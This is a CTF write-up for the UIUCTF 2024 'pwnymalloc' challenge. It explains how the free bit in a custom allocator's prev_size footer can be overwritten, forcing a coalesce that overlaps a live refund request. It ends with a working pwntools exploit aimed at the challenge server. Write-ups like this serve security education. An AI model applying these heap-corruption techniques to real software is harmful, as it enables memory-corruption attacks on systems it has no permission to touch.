---
title: "UIUCTF 2024 pwnymalloc: coalescing a forged chunk over a live request"
description: A hand-written allocator stores the free bit in the low bit of a chunk's size and reads the previous chunk's size from a footer that the neighboring payload can rewrite.
pubDate: 2024-07-11
draft: false
---
Source: [github.com/Lu1sDV/ctf_writeups — UIUCTF.2K24/pwnymalloc](https://github.com/Lu1sDV/ctf_writeups/tree/master/UIUCTF.2K24/pwnymalloc)

Category: **PWN**
Points: **461**
Solves: **65**


```sh
Author: Akhil

i'm tired of hearing all your complaints. pwnymalloc never complains.

ncat --ssl pwnymalloc.chal.uiuc.tf 1337
```

## Attachments

- alloc.c
- alloc.h
- main.c
- Makefile
- chal

## Index

- [Pwnymalloc](#pwnymalloc)
  - [Attachments](#attachments)
  - [Index](#index)
  - [TL;DR](#tldr)
  - [Solve](#solve)
  - [Considerations](#considerations)
  - [Exploit](#exploit)

## TL;DR

We have a custom implementation of a dynamic Memory Allocator. We are given the source code of our binary and memory allocator.

Multiple vulnerabilities can be observed in our malloc, but our range of action in our binary is pretty limited.

When executing our binary we can:

- Call malloc with a fixed size and write into it how many times we want.
- Call malloc with a fixed size followed by subsequently freeing that chunk

Analyzing `alloc.c` I find that when allocating a chunk we can overwrite what the *prev_size* bytes will be. *prev_size* bytes are the bytes used by a freed chunk to understand if they must coalesce with the previous chunk once freed, and by what extent. The obtained freed chunk will be inserted in our free chunk list, which will be popped in the next *malloc* call.

Thus, I forge those bytes in a manner that I can obtain arbitrary write in a chunk by overlapping them.

Once accomplished that, I can reach the purpose of the challenge: overwriting the status of a refund request, which will permit us to have our flag printed, nothing too esoteric.

 

## Solve

Let's explain it with a bit more details.

```sh
gef➤  checksec
[+] checksec for '/home/x/CTF/UIUCTF2K24/pwnymalloc/chal'
Canary                        : ✓ (value: 0x8fbc99bc1455ec00)
NX                            : ✓ 
PIE                           : ✓ 
Fortify                       : ✘ 
RelRO                         : Full

```

This is the menu:

```sh
> ./chal
Welcome to the SIGPwny Transit Authority\'s customer service portal! How may we help you today>

1. Submit a complaint
2. View pending complaints
3. Request a refund
4. Check refund status
5. Exit

```

So we can request a refund, its code is the following:

```c
void handle_refund_request() {
    int request_id = -1;
    for (int i = 0; i < 10; i++) {
        if (requests[i] == NULL) {
            request_id = i;
            break;
        }
    }

    if (request_id == -1) {
        puts("Sorry, we are currently unable to process any more refund requests.");
    }

    refund_request_t *request = pwnymalloc(sizeof(refund_request_t));
    puts("Please enter the dollar amount you would like refunded:");
    char amount_str[0x10];
    fgets(amount_str, 0x10, stdin);
    sscanf(amount_str, "%d", &request->amount);

    puts("Please enter the reason for your refund request:");
    fgets(request->reason, 0x80, stdin);
    request->reason[0x7f] = '\0'; // null-terminate

    puts("Thank you for your request! We will process it shortly.");
    request->status = REFUND_DENIED;

    requests[request_id] = request;

    printf("Your request ID is: %d\n", request_id);
}
```

So it lets us allocing a `refund_request_t` struct (within fixed boundaries), then it sets `request->status = REFUND_DENIED;` . Our goal for exploiting the binary is setting status to *approved*:



```c 
    if (request->status == REFUND_APPROVED) {
        puts("Your refund request has been approved!");
        puts("We don't actually have any money, so here's a flag instead:");
        print_flag();
    } 
```

What else can we execute within the binary?

```c
void handle_complaint() {
    puts("Please enter your complaint:");
    char *trash = pwnymalloc(0x48);
    fgets(trash, 0x48, stdin);
    memset(trash, 0, 0x48);
    pwnyfree(trash);
    puts("Thank you for your feedback! We take all complaints very seriously.");
}
```

This looks like an important function for our aim. We can alloc a chunk, thus subsequently free it. 



It is clear that our scope is very limited, classic heap vulnerabilities are out of scope, since we can execute limited malloc and free operation.

So where the vulnerability lies ?

It appears to be within `pwnymalloc(size_t size)`. When we free a chunk it will call `coalesce` , which will merge freed chunk in case there are some neighboring ones. `coalesce` will call `prev_chunk`:

```c

static chunk_ptr prev_chunk(chunk_ptr block) {
    if ((void *) block - get_prev_size(block) < heap_start || get_prev_size(block) == 0) {
        return NULL;
    }
    return (chunk_ptr) ((char *) block - get_prev_size(block));
}
```

`prev_chunk` returns the previous chunk, with its offset starting where chunk metadata start.

Then we have the clue snippet!

```c
    int prev_status = prev_block == NULL ? -1 : get_status(prev_block);
    int next_status = next_block == NULL ? -1 : get_status(next_block);
    if (prev_status == FREE && next_status == FREE) {
        free_list_remove(next_block);
        free_list_remove(prev_block);

        size += get_size(prev_block) + get_size(next_block);
        prev_block->size = pack_size(size, FREE);
        set_btag(prev_block, size);
        
        return prev_block;
    } 
```

So it will merge a previous chunk in case `get_status(prev_block);` returns *FREE* , and how does it check if *prev_block* is *FREE* ?

```c
typedef struct chunk_meta {
    size_t size;
    struct chunk_meta *next; // only for free blocks
    struct chunk_meta *prev; // only for free blocks
} chunk_meta_t;

static int get_status(chunk_ptr block) {
    return block->size & 1;
}

```

It checks for `block->size `'s last byte value in chunk metadata, but we can easily overwrite it when allocing a chunk! That's very similar to `ptmalloc` *prev_size* value, but with the difference that here *prev_size* can be overwritten without surpassing chunk boundaries, like a *null byte overflow* in `ptmalloc`.

So my strategy is pretty easy: 

overwrite  `block->size` in a manner that size is greater than our standard *0x80*-sized chunk and its LSB is 0, which points out that our *prev_chunk* is not in use, which will allow me to merge the next freed chunk thank to `coalesce`. 

So I request a refund trough our menu, which will call the previously seen `handle_refund_request()`, that alloc a chunk and there we can set `block->size` to our designed value.

Then will call the previously seen `handle_complaint()` which will trigger `coalesce`.

This allows me to have a bigger than usual freed chunk, and its pointer will be saved in a *free_list* , hence in the next malloc that chunk in the *free_list* will be popped and the malloc chunk will lie there, allowing to overlap chunks, thus allowing to set `request->status == REFUND_APPROVED`  and profit.

Amidst all this, some precautions will be taken to successfully exploit it and I will leave them an exercise(a sweetened way to say that i'm too lazy to do it).


## Considerations

I find custom malloc implementation very funny and interesting, since we have to really reason behind malloc logics, while in standard `ptmalloc` vulnerabilities we could proceed mnemonically/notionally, ignoring the real malloc logics. 

## Exploit

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./chal")
context.terminal = ["tmux", "splitw", "-h"]
context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
           gdb.attach(r)
    else:
        r = remote("pwnymalloc.chal.uiuc.tf", 1337, ssl=True)

    return r

def request_refund(dollar_amount, reason):
    r.recvuntil("5. Exit\n")
    r.sendline("3")
    r.recvuntil("Please enter the dollar amount you would like refunded:")
    r.sendline(str(dollar_amount))
    r.recvuntil("Please enter the reason for your refund request:")
    r.sendline(reason)

def request_bugged_refund(dollar_amount, reason):
    r.recvuntil("Please enter the dollar amount you would like refunded:")
    r.sendline(str(dollar_amount))
    r.recvuntil("Please enter the reason for your refund request:")
    r.sendline(reason)

def submit_complaint(complaint):
    r.recvuntil("5. Exit\n")
    r.sendline("1")
    r.recvuntil("Please enter your complaint:")
    r.sendline(complaint)

def check_refund_status(idx):
    r.recvuntil("5. Exit\n")
    r.sendline("4")
    r.recvuntil("Please enter your request ID:")
    r.sendline(str(idx))

def main():
    global r
    r = conn()
    
    free_coalesce_payload = b"a" * 0x78 + b"\x10"
    request_refund(100, b"a"*0x7f)
    for i in range(20):
        payload = b"a"*0x7f
        if i == 3:
            payload = p64(0x92) + p64(0)* 15
         
        request_bugged_refund(100, payload)
    
    request_bugged_refund(100, free_coalesce_payload)

    submit_complaint("A"*0x10)
    set_status_payload = b"b" * 0x78 + p32(0x01) + b"\x00"
    request_refund(100, set_status_payload)

    check_refund_status(5)

    r.interactive()


if __name__ == "__main__":
    main()
```

